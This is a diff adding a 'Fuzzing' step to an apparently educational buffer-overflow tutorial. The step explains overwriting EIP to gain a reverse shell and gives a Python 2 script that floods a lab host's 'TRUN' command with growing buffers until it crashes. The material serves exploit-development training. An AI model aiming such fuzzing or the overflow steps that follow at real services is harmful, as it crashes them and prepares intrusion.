@@ -97,7 +97,35 @@ Note:
 >**Q: What is EIP and why it is very important to understand?** \
 >**A:** The Instruction Pointer (IP) is where the actual command executes!! So, if we can overwrite this, we can send malicious code and gain reverse shell.
 
+## II. Fuzzing
 
+1. We will automate the sending of bunch of As using python script. Make a python2 script ‘fuzz.py’ and copy paste this script.
+
+fuzz.py
+
+````python
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = 'A' * 100 
+
+while True:
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect(('192.168.17.134', 9999))
+
+
+		s.send(('TRUN /.:/' + buffer))
+		s.close()
+		sleep(1) 
+		buffer = buffer + 'A' * 100
+		
+	except:
+		print "Fuzzing crashed at %s bytes" % str(len(buffer)) 
+		sys.exit()
+
+````
 
 
 
